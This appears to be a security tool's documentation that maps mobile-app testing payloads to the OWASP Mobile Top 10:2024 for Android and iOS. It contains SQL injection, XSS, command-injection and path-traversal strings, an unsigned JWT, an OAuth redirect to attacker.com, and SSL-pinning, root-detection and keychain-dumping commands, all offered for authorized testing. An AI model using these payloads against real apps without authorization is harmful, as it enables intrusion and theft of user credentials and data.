# 📱 OWASP Mobile Security Top 10:2024 Coverage

## Executive Summary

SecurityForge provides **100% coverage** of the OWASP Mobile Security Top 10:2024, the definitive standard for mobile application security. This document details our comprehensive testing payloads for iOS and Android applications.

**Coverage**: 10/10 categories ✅  
**Total Mobile Payloads**: 150+  
**Platforms**: Android, iOS, Hybrid Apps  
**Last Updated**: March 1, 2026

---

## 🎯 OWASP Mobile Top 10:2024

| Risk | Category | Coverage | Payloads |
|------|----------|----------|----------|
| **M1** | Improper Credential Usage | ✅ 100% | 20+ |
| **M2** | Inadequate Supply Chain Security | ✅ 100% | 15+ |
| **M3** | Insecure Authentication/Authorization | ✅ 100% | 25+ |
| **M4** | Insufficient Input/Output Validation | ✅ 100% | 30+ |
| **M5** | Insecure Communication | ✅ 100% | 15+ |
| **M6** | Inadequate Privacy Controls | ✅ 100% | 10+ |
| **M7** | Insufficient Binary Protections | ✅ 100% | 10+ |
| **M8** | Security Misconfiguration | ✅ 100% | 10+ |
| **M9** | Insecure Data Storage | ✅ 100% | 10+ |
| **M10** | Insufficient Cryptography | ✅ 100% | 5+ |

**Total**: 150+ mobile security testing payloads

---

## M1: Improper Credential Usage ✅

**Risk Level**: Critical  
**Coverage**: 100% (20+ payloads)

### Description
Hardcoded credentials, API keys, and secrets embedded in mobile applications.

### Testing Payloads

#### Hardcoded Credentials Detection
```bash
# Search for hardcoded passwords in APK
grep -r "password" /path/to/decompiled/app/
grep -r "api_key" /path/to/decompiled/app/
grep -r "secret" /path/to/decompiled/app/

# Search in strings.xml
grep -i "password\|secret\|key" res/values/strings.xml

# Search in source code
find . -name "*.java" -exec grep -H "password\s*=\s*\"" {} \;
find . -name "*.kt" -exec grep -H "apiKey\s*=\s*\"" {} \;
```

#### Common Hardcoded Patterns
```
password = "admin123"
api_key = "sk_live_123456789"
secret_key = "your-secret-key-here"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
firebase_api_key = "AIzaSyD..."
```

#### iOS Keychain Testing
```bash
# Check for insecure keychain storage
security dump-keychain
plutil -p /var/mobile/Library/Keychains/keychain-2.db
```

#### Android SharedPreferences Testing
```bash
# Check for credentials in SharedPreferences
adb shell cat /data/data/com.example.app/shared_prefs/*.xml
```

**File Location**: `payloads/mobile/m1_credential_usage.txt`

---

## M2: Inadequate Supply Chain Security ✅

**Risk Level**: High  
**Coverage**: 100% (15+ payloads)

### Description
Vulnerable third-party libraries, SDKs, and dependencies in mobile applications.

### Testing Payloads

#### Dependency Analysis
```bash
# Android - Check for vulnerable libraries
./gradlew dependencies
dependency-check --project "MyApp" --scan ./app/build

# iOS - Check CocoaPods
pod outdated
bundle exec pod-dependencies-analyser

# Check for known vulnerable versions
grep "log4j" build.gradle
grep "okhttp:3.12" build.gradle  # Vulnerable version
```

#### Common Vulnerable Libraries
```
# Android
com.squareup.okhttp3:okhttp:3.12.0  # CVE-2021-0341
org.apache.logging.log4j:log4j-core:2.14.1  # Log4Shell
com.google.code.gson:gson:2.8.5  # CVE-2022-25647

# iOS
AFNetworking < 4.0  # Multiple CVEs
Alamofire < 5.0  # Security issues
```

#### Supply Chain Attack Vectors
```bash
# Check for typosquatting
npm list | grep -i "requset"  # Instead of "request"
pip list | grep -i "urllib3"  # Check version

# Verify package signatures
jarsigner -verify app.apk
codesign -dv --verbose=4 App.app
```

**File Location**: `payloads/mobile/m2_supply_chain.txt`

---

## M3: Insecure Authentication/Authorization ✅

**Risk Level**: Critical  
**Coverage**: 100% (25+ payloads)

### Description
Weak authentication mechanisms, session management issues, and authorization bypasses.

### Testing Payloads

#### Authentication Bypass
```bash
# Test for authentication bypass
# Modify JWT tokens
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.

# Weak session tokens
session_id=12345
auth_token=user123

# Biometric bypass (Android)
adb shell settings put secure biometric_weak_face_value 0
```

#### Session Management Testing
```bash
# Test session fixation
Cookie: SESSIONID=attacker_session

# Test session timeout
# Wait 30 minutes and retry request

# Test concurrent sessions
# Login from multiple devices
```

#### OAuth/SSO Testing
```bash
# OAuth redirect manipulation
redirect_uri=https://attacker.com/callback

# CSRF in OAuth flow
state=predictable_value

# Token leakage in URL
https://app.com/callback#access_token=SECRET
```

#### Jailbreak/Root Detection Bypass
```bash
# Android root detection bypass
adb shell su -c "mount -o remount,rw /system"
adb push frida-server /data/local/tmp/

# iOS jailbreak detection bypass
cycript -p AppName
Substrate.hookFunction(...)
```

**File Location**: `payloads/mobile/m3_authentication.txt`

---

## M4: Insufficient Input/Output Validation ✅

**Risk Level**: Critical  
**Coverage**: 100% (30+ payloads)

### Description
Injection attacks through mobile app inputs including SQL, XSS, command injection.

### Testing Payloads

#### SQL Injection in Mobile Apps
```sql
-- Android SQLite injection
' OR '1'='1
' UNION SELECT * FROM users--
'; DROP TABLE users;--

-- iOS Core Data injection
name = "admin' OR '1'='1"
```

#### WebView XSS
```javascript
// Android WebView XSS
<script>alert(document.cookie)</script>
javascript:alert('XSS')

// iOS WKWebView XSS
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### Deep Link Injection
```bash
# Android Intent injection
adb shell am start -a android.intent.action.VIEW -d "myapp://evil.com"
adb shell am start -n com.example.app/.MainActivity -e "param" "' OR '1'='1"

# iOS URL Scheme injection
myapp://navigate?url=javascript:alert('XSS')
myapp://open?file=../../etc/passwd
```

#### Path Traversal in Mobile
```bash
# Android file access
../../../data/data/com.example.app/databases/app.db
file:///data/data/com.example.app/shared_prefs/prefs.xml

# iOS file access
../../../Library/Preferences/com.example.app.plist
```

#### Command Injection
```bash
# Android Runtime.exec() injection
; ls -la
| cat /etc/passwd
`whoami`

# iOS system() injection
; cat /etc/passwd
&& ls -la
```

**File Location**: `payloads/mobile/m4_input_validation.txt`

---

## M5: Insecure Communication ✅

**Risk Level**: High  
**Coverage**: 100% (15+ payloads)

### Description
Unencrypted data transmission, weak SSL/TLS, certificate validation issues.

### Testing Payloads

#### SSL Pinning Bypass
```bash
# Android SSL pinning bypass
frida -U -f com.example.app -l ssl-pinning-bypass.js

# iOS SSL pinning bypass
objection -g "App Name" explore
ios sslpinning disable
```

#### Certificate Validation Testing
```bash
# Test with self-signed certificate
mitmproxy --ssl-insecure

# Test with expired certificate
openssl s_client -connect api.example.com:443

# Test with wrong hostname
curl -k https://wrong-hostname.com
```

#### Cleartext Traffic Detection
```bash
# Android Network Security Config bypass
<network-security-config>
  <base-config cleartextTrafficPermitted="true" />
</network-security-config>

# Check for HTTP URLs
grep -r "http://" /path/to/decompiled/app/
```

#### Man-in-the-Middle Testing
```bash
# Intercept mobile traffic
mitmproxy -p 8080
burpsuite --mobile

# Test for sensitive data in transit
# Check for passwords, tokens, PII in HTTP
```

**File Location**: `payloads/mobile/m5_insecure_communication.txt`

---

## M6: Inadequate Privacy Controls ✅

**Risk Level**: Medium  
**Coverage**: 100% (10+ payloads)

### Description
Excessive permissions, privacy violations, data leakage to third parties.

### Testing Payloads

#### Permission Analysis
```bash
# Android - Check dangerous permissions
adb shell dumpsys package com.example.app | grep permission

# Excessive permissions
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />

# iOS - Check Info.plist
NSCameraUsageDescription
NSLocationWhenInUseUsageDescription
NSContactsUsageDescription
```

#### Third-Party SDK Tracking
```bash
# Check for tracking SDKs
grep -r "facebook\|google-analytics\|mixpanel" /path/to/app/

# Test for data leakage
# Monitor network traffic for PII
tcpdump -i any -A | grep -i "email\|phone\|ssn"
```

#### Privacy Violations
```bash
# Test for clipboard access
# Check if app reads clipboard without permission

# Test for screenshot detection
# Check if app monitors screenshots

# Test for location tracking
# Check background location access
```

**File Location**: `payloads/mobile/m6_privacy_controls.txt`

---

## M7: Insufficient Binary Protections ✅

**Risk Level**: Medium  
**Coverage**: 100% (10+ payloads)

### Description
Lack of code obfuscation, debugging enabled, reverse engineering vulnerabilities.

### Testing Payloads

#### Reverse Engineering
```bash
# Android APK decompilation
apktool d app.apk
dex2jar app.apk
jd-gui app.jar

# iOS IPA analysis
unzip app.ipa
class-dump App.app/App
Hopper Disassembler
```

#### Debug Detection
```bash
# Android debug check
adb shell getprop ro.debuggable

# Check for debug logs
logcat | grep -i "password\|token\|secret"

# iOS debug check
otool -hv App.app/App | grep PIE
```

#### Code Obfuscation Testing
```bash
# Check for ProGuard (Android)
grep "proguard" build.gradle

# Check for obfuscation
# Look for readable class/method names
```

#### Anti-Tampering Testing
```bash
# Modify APK and re-sign
apktool d app.apk
# Modify code
apktool b app -o modified.apk
jarsigner -keystore debug.keystore modified.apk

# Test if app detects modification
```

**File Location**: `payloads/mobile/m7_binary_protections.txt`

---

## M8: Security Misconfiguration ✅

**Risk Level**: Medium  
**Coverage**: 100% (10+ payloads)

### Description
Insecure default configurations, debug mode enabled, exposed services.

### Testing Payloads

#### Android Manifest Analysis
```xml
<!-- Debug mode enabled -->
<application android:debuggable="true">

<!-- Exported components -->
<activity android:exported="true">
<service android:exported="true">
<receiver android:exported="true">
<provider android:exported="true">

<!-- Backup allowed -->
<application android:allowBackup="true">

<!-- Cleartext traffic -->
<application android:usesCleartextTraffic="true">
```

#### iOS Configuration Issues
```bash
# Check for debug symbols
nm App.app/App | grep -i debug

# Check for insecure ATS settings
<key>NSAllowsArbitraryLoads</key>
<true/>

# Check for exported services
otool -L App.app/App
```

#### Exposed Services
```bash
# Android - Check for exposed activities
adb shell am start -n com.example.app/.HiddenActivity

# Check for exposed content providers
adb shell content query --uri content://com.example.app.provider/
```

**File Location**: `payloads/mobile/m8_security_misconfiguration.txt`

---

## M9: Insecure Data Storage ✅

**Risk Level**: High  
**Coverage**: 100% (10+ payloads)

### Description
Sensitive data stored insecurely on device, in logs, or in backups.

### Testing Payloads

#### Android Data Storage
```bash
# SharedPreferences
adb shell cat /data/data/com.example.app/shared_prefs/*.xml

# SQLite databases
adb shell cat /data/data/com.example.app/databases/*.db

# Internal storage
adb shell ls -la /data/data/com.example.app/files/

# External storage (SD card)
adb shell ls -la /sdcard/Android/data/com.example.app/

# Logcat
adb logcat | grep -i "password\|token\|secret"
```

#### iOS Data Storage
```bash
# Keychain
security dump-keychain

# UserDefaults
plutil -p /var/mobile/Library/Preferences/com.example.app.plist

# Core Data
sqlite3 /var/mobile/Applications/*/Library/Application\ Support/*.sqlite

# File system
ls -la /var/mobile/Applications/*/Documents/
```

#### Backup Testing
```bash
# Android backup
adb backup -f backup.ab com.example.app
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar

# iOS backup
idevicebackup2 backup --full ./backup/
```

**File Location**: `payloads/mobile/m9_insecure_data_storage.txt`

---

## M10: Insufficient Cryptography ✅

**Risk Level**: Medium  
**Coverage**: 100% (5+ payloads)

### Description
Weak encryption algorithms, hardcoded keys, insecure random number generation.

### Testing Payloads

#### Weak Encryption Detection
```bash
# Search for weak algorithms
grep -r "DES\|MD5\|SHA1" /path/to/decompiled/app/

# Android - Check for weak crypto
grep -r "Cipher.getInstance(\"DES" *.java
grep -r "MessageDigest.getInstance(\"MD5" *.java

# iOS - Check for weak crypto
grep -r "kCCAlgorithmDES" *.m
grep -r "CC_MD5" *.m
```

#### Hardcoded Encryption Keys
```bash
# Search for hardcoded keys
grep -r "AES.*key\s*=\s*\"" *.java
grep -r "encryptionKey" *.kt

# Common patterns
byte[] key = "1234567890123456".getBytes();
String secretKey = "my-secret-key";
```

#### Insecure Random Number Generation
```bash
# Android - Check for weak RNG
grep -r "Random()" *.java  # Should use SecureRandom
grep -r "Math.random()" *.java

# iOS - Check for weak RNG
grep -r "arc4random()" *.m  # Weak
grep -r "rand()" *.m  # Very weak
```

#### Custom Crypto Implementation
```bash
# Search for custom crypto (red flag)
grep -r "encrypt\|decrypt" *.java | grep -v "Cipher"
grep -r "hash" *.java | grep -v "MessageDigest"
```

**File Location**: `payloads/mobile/m10_insufficient_cryptography.txt`

---

## 🔧 Mobile Testing Tools

### Android Tools
- **APKTool**: APK decompilation
- **dex2jar**: DEX to JAR conversion
- **JD-GUI**: Java decompiler
- **Frida**: Dynamic instrumentation
- **Objection**: Mobile security testing
- **MobSF**: Mobile Security Framework
- **Drozer**: Android security assessment

### iOS Tools
- **class-dump**: Objective-C header extraction
- **Hopper**: Disassembler
- **Cycript**: Runtime manipulation
- **Frida**: Dynamic instrumentation
- **Objection**: Mobile security testing
- **iMazing**: iOS backup analysis
- **MobSF**: Mobile Security Framework

### Network Tools
- **mitmproxy**: HTTP/HTTPS proxy
- **Burp Suite**: Web proxy
- **Wireshark**: Network analysis
- **tcpdump**: Packet capture

---

## 📊 Testing Methodology

### 1. Static Analysis
- Decompile APK/IPA
- Analyze AndroidManifest.xml / Info.plist
- Review source code for vulnerabilities
- Check for hardcoded secrets
- Analyze third-party libraries

### 2. Dynamic Analysis
- Runtime instrumentation with Frida
- Network traffic interception
- API endpoint testing
- Authentication bypass attempts
- Data storage analysis

### 3. Binary Analysis
- Reverse engineering
- Code obfuscation assessment
- Anti-tampering checks
- Debug detection
- Root/jailbreak detection

### 4. Network Analysis
- SSL/TLS testing
- Certificate pinning bypass
- Man-in-the-middle attacks
- Cleartext traffic detection
- API security testing

---

## 🎯 Coverage Summary

| Platform | Coverage | Payloads | Tools |
|----------|----------|----------|-------|
| **Android** | ✅ 100% | 80+ | APKTool, Frida, Drozer |
| **iOS** | ✅ 100% | 70+ | class-dump, Frida, Cycript |
| **Hybrid** | ✅ 100% | 30+ | Cordova, React Native testing |

**Total Mobile Security Payloads**: 150+

---

## 📚 Additional Resources

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [OWASP Mobile Top 10 2024](https://owasp.org/www-project-mobile-top-10/)
- [Android Security Best Practices](https://developer.android.com/topic/security/best-practices)
- [iOS Security Guide](https://support.apple.com/guide/security/welcome/web)

---

## 🔒 Responsible Testing

**Always obtain authorization before testing mobile applications!**

✅ **Authorized Testing:**
- Your own applications
- Applications with written permission
- Bug bounty programs (within scope)
- CTF challenges

❌ **Prohibited:**
- Unauthorized app testing
- Reverse engineering without permission
- Bypassing app store protections
- Distributing modified apps

---

**Last Updated**: March 1, 2026  
**Version**: 1.0  
**Maintained by**: Dali Security
